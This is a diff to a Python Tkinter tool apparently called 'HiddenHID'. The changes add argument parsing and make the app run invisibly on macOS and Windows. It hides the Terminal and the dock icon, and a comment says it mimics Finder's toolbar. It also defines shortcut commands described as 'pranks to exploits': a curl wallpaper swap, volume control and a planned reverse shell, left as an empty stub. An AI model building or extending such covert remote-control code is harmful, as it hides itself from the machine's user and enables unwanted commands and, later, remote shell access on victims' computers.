@@ -12,6 +12,8 @@ from subprocess import run as shell
 from sys import argv
 # Get host OS
 from platform import system as os
+# For RegExp, unfortunately
+from re import search
 
 
 class App(Tk):
@@ -21,36 +23,85 @@ class App(Tk):
     def __init__(self):
         # Store host OS
         self.os = os()
-
-        # macOS stuff
-        if self.os == "Darwin":
-            # Make the terminal invisible
-            if "vis" not in argv and "visible" not in argv:
-                shell(
-                    'osascript -e \'tell application "Finder"\nset visible of process "Terminal" to false\nend tell\'',
-                    shell=True, check=False)
-
+        # Whether the app should be visible
+        self.visible = False
+        # If there should be extra output
+        self.debug = False
         # Actually set up Tkinter
         super().__init__()
 
+        # Parse command-line arguments
+        for arg in argv:
+            # The output argument: "output path/to/log/file" or "output=path/to/log/file"
+            # "HiddenHID loaded" will be appended to the file at that location
+            if search("^-*o(utput)?=.*$", arg) is not None:
+                outFile = arg.split('=', 1)[1]
+                if self.debug:
+                    print("Output file: " + outFile)
+                with open(outFile, 'a') as file:
+                    file.write('HiddenHID loaded\n')
+                    file.close()
+            # The visible argument: "vis" or "visible"
+            # Makes the normally invisible window visible, as well as the terminal on macOS
+            elif search("^-*v(is)?(ible)?$", arg) is not None:
+                self.visible = True
+            # Debug argument: "debug"
+            # Adds additional output in the terminal, like a -v argument
+            elif search("^-*d(ebug)?$", arg) is not None:
+                self.debug = True
+                print("Debug mode enabled")
+
+        # macOS stuff (Darwin = macOS)
+        if self.os == "Darwin":
+            # If the window is supposed to be invisible
+            if not self.visible:
+                # Hide the terminal
+                shell(
+                    'osascript -e \'tell application "Finder"\nset visible of process "Terminal" to false\nend tell\'',
+                    shell=True, check=False)
+                # Make the window invisible
+                self.attributes('-alpha', 0)
+
+        # Windows stuff
+        elif self.os == "Windows":
+            # If the window is supposed to be invisible
+            if not self.visible:
+                # Make the window invisible
+                self.attributes('-alpha', 0)
+                # Hide the app icon from the app dock
+                self.attributes('-toolwindow', True)
+
+        # Other hosts
+        else:
+            # Make the window invisible
+            self.attributes('-alpha', 0)
+
         # Shortcut commands
-        # Shell functions
+        # Reverse shell, coming soon :P
         def revShell(*args):
             return
+
+        # Shortcut commands, ranging from pranks to exploits
         self.shortcuts = {
+            # macOS shortcuts
             'Darwin': {
+                # Change the macOS wallpaper: Run as "wallpaper <image url>"
                 'wallpaper': 'curl -o "/tmp/wallpaper" "{args[0]}"; osascript -e \'tell application\
                      "Finder" to set the desktop picture to POSIX file "/tmp/wallpaper"\'; rm\
                      /tmp/wallpaper',
+                # Set the macOS volume level: Run as "volume <volume level>", with a min of 0 and max of 10
                 'volume': 'osascript -e \'set Volume {args[0]}\'',
+                # Set the macOS volume to 0
                 'mute': 'osascript -e \'set Volume 0\'',
+                # Reverse shell
+                'shell': revShell
+            },
+            # Windows shortcuts
+            'Windows': {
+                # Reverse shell
                 'shell': revShell
             }
         }
-
-        # If 'visible' is not passed as an argument, make the window invisible
-        if "vis" not in argv and "visible" not in argv:
-            self.attributes('-alpha', 0)
 
         # Commands are typed into the entry box
         self.entry = Entry(self)
@@ -62,16 +113,6 @@ class App(Tk):
         self.entry.bind('<Enter>', self.run_command)
         # It's the return key on some devices, so bind that too
         self.entry.bind('<Return>', self.run_command)
-
-        # If debug is passed as an argument, enable debug mode, otherwise disable it
-        if "debug" in argv:
-            # Show debug mode is enabled
-            print("Debug mode enabled")
-            # Enable debug mode
-            self.debug = True
-        else:
-            # Disable debug mode
-            self.debug = False
 
         # On macOS, toolbars still show for invisible apps
         # This clones the toolbar from Finder, so it looks like Finder is open
